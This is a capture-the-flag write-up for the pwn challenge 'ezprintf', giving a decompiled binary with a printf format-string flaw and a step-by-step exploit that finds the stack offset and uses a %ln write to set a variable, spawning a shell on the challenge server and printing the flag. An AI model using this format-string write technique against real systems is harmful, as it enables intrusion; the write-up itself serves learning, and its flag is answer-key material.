# ezprintf
Pwn

## Challenge 

Printf is wonky. Time to exploit its wonkyness.

nc challs.hats.sg 1304

Reading material:

https://www.exploit-db.com/docs/english/28476-linux-format-string-exploitation.pdf
Author: @dickheadedzed

## Hint

## Solution

Decompile in Hopper

	int main() {
	    setvbuf(*stdin@@GLIBC_2.2.5, 0x0, 0x2, 0x0);
	    setvbuf(*__TMC_END__, 0x0, 0x2, 0x0);
	    *(int32_t *)magic = 0x0;
	    read(0x0, &var_410, 0x400);
	    printf(&var_410);
	    if (*(int32_t *)magic != 0x0) {
	            system("/bin/sh");
	    }
	    rax = 0x0;
	    rcx = *0x28 ^ *0x28;
	    if (rcx != 0x0) {
	            rax = __stack_chk_fail();
	    }
	    return rax;
	}

We simply need to write something to address of `magic` (which is at `0x60106c`).

	python -c 'from pwn import *; print "%lx" + p64(0x60106c) | nc challs.hats.sg 1304

Fuzz for offset

	# python -c 'from pwn import *; print "AAAABBBB:" + "%lx-" * 10' | nc challs.hats.sg 1304
	AAAABBBB:7fff777e6ef0-400-7faafdc79260-7faafdf48780-0-4242424241414141-786c252d786c253a-786c252d786c252d-786c252d786c252d-786c252d786c252d-

We see it at offset 6

	# python -c 'from pwn import *; print "AAAABBBB:" + "%06$lx"' | nc challs.hats.sg 1304
	AAAABBBB:4242424241414141

And since we are working with 64-bits, the address has null bytes. So we must add the address behind our payload at offset 7.


	# python -c 'from pwn import *; print "%07$lx  " + p64(0x4142434445464748)' | nc challs.hats.sg 1304
	4142434445464748  HGFEDCBA

Now change to our magic address.

	# (python -c 'from pwn import *; print " %07$ln " + p64(0x60106c)'; cat) | nc challs.hats.sg 1304
	  l`ls
		bin
		dev
		ezprintf
		flag
		lib
		lib32
		lib64
	cat flag
	HATS{h3h1_that_w1z_3z}

## Flag

	HATS{h3h1_that_w1z_3z}
